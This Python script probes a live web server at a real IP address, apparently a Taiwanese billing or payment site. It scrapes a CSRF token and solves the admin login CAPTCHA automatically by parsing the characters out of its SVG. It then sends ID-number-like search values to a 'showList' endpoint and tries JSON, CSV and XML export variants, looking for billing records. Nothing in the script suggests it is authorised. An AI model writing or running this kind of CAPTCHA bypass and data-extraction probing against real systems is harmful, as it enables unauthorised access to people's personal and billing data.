#!/usr/bin/env python3
"""
Test showList endpoint with actual data
"""

import requests
import re

TARGET = "https://210.69.42.55"
sess = requests.Session()
sess.verify = False

# Get fresh session
print("=== Getting fresh session ===")
r = sess.get(f"{TARGET}/admin/login")
print(f"Session initial: {r.status_code}")

# Get token
token_match = re.search(r'name="_token" value="([^"]+)"', r.text)
if token_match:
    token = token_match.group(1)
    print(f"Token: {token}")

# Get captcha
r = sess.get(f"{TARGET}/admin/captcha")
svg = r.text
# Extract each captcha character by position from the SVG
chars = re.findall(r'<text[^>]*>([A-Z0-9])</text>', svg)
captcha = ''.join(chars)
print(f"Captcha: {captcha}")

# Try showList with different inputs
print("\n=== Testing showList endpoint ===")
test_inputs = ["1234567890", "A123456789", "1102001234567890", "test", "admin"]

for test_input in test_inputs:
    r = sess.post(f"{TARGET}/showList", data={
        "_token": token,
        "search": test_input
    }, allow_redirects=False)
    print(f"search={test_input}: {r.status_code}, Location: {r.headers.get('Location', 'N/A')}")
    
    # If redirect, follow and check content
    if r.status_code == 302:
        r2 = sess.get(r.headers['Location'])
        if "419" in r2.text:
            print(f"  -> Session expired (419)")
        elif "繳費" in r2.text or "帳單" in r2.text:
            print(f"  -> Possible data response")
        else:
            print(f"  -> Response preview: {r2.text[:200]}")

# Try JSON format
print("\n=== Testing JSON responses ===")
r = sess.get(f"{TARGET}/showList?search=1234567890&format=json")
print(f"JSON endpoint: {r.status_code}, Content-Type: {r.headers.get('Content-Type', 'N/A')}")
print(f"Preview: {r.text[:300]}")

# Check for CSV endpoint
print("\n=== Checking export endpoints ===")
for ext in ["", ".csv", ".json", ".xml", "?format=csv", "?format=json"]:
    r = sess.get(f"{TARGET}/showList{ext}")
    print(f"/showList{ext}: {r.status_code}")